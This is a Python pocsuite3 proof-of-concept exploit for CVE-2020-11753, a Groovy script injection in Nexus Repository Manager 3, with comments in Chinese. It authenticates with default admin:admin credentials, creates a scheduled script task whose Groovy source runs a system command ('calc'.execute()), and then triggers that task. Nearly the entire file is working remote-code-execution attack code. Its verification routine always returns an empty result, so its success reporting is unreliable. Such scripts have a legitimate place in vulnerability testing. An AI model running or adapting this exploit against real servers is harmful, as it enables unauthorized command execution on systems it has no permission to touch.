#!/usr/bin/env python
#coding=utf-8

import sys
import random
import json
import base64

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

'''
CVE-2020-11753: Nexus 3 groovy injection(Improper Access Controls)
Admin access is required
This is a feature removed since 3.22.0
'''
class Nexus3_2020_11753_groovy_INJECTION_POC(POCBase):
    vulID = 'Nexus3-groovy-injection'
    appName = 'Nexus3'
    appVersion = 'Nexus Repository Manager OSS/Pro <=3.21.2(官方说是3.21.1 and 3.22.0)'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2020-04-16'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-03'  # 编写 PoC 的日期
    updateDate = '2020-04-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://support.sonatype.com/hc/en-us/articles/360046233714-CVE-2020-11753-Nexus-Repository-Manager-3-Improper-Access-Controls-2020-04-16']  # 漏洞地址来源,0day不用写
    name = 'Nexus3 groovy injection'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"



    def _verify(self):
        result={}

        vul_url = self.url
        
        target_url = vul_url + "/service/extdirect"

        j = {
            "action": "coreui_Task",
            "method": "create",
            "data": [
              {
                "id": "NX.coreui.model.Task-2",
                "typeId": "script",
                "enabled": "true",
                "name": "test_exec",
                "alertEmail": "77@gmail.com",
                "schedule": "manual",
                "properties": {
                  "language": "groovy",
                  "source": "println \"calc\".execute().text"
                },
                "recurringDays": [],
                "startDate": None,
                "timeZoneOffset": "+08:00"
              }
            ],
            "type": "rpc",
            "tid": 14
        }

        
        self.headers.update(self.auth())

        self.headers.pop('User-Agent')    # 删除默认UA，避免产生CSRF错误

        resp = req.post(target_url, json=j, headers=self.headers, proxies=self.proxies)
        
        # 拿到task id
        task_id = self.get_task_id(resp)
        

        j2 = {
            "action": "coreui_Task",
            "method": "run",
            "data": [
                task_id
            ],
            "type": "rpc",
            "tid": 17
        }

        req.post(target_url, json=j2, headers=self.headers, proxies=self.proxies)

        return self.save_output(result)



    def auth(self):
        user = "admin"
        password = "admin"
        tmp = user + ':' + password
        auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
        headers = {'Authorization': 'Basic'+' '+auth}
        return headers



    # 拿到task id
    def get_task_id(self, p_resp):
        if p_resp.status_code == 401:
            sys.exit("401 认证失败")
        d = p_resp.json()
        result = d['result']['data']['id']
        print(result)
        return result         


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(Nexus3_2020_11753_groovy_INJECTION_POC)
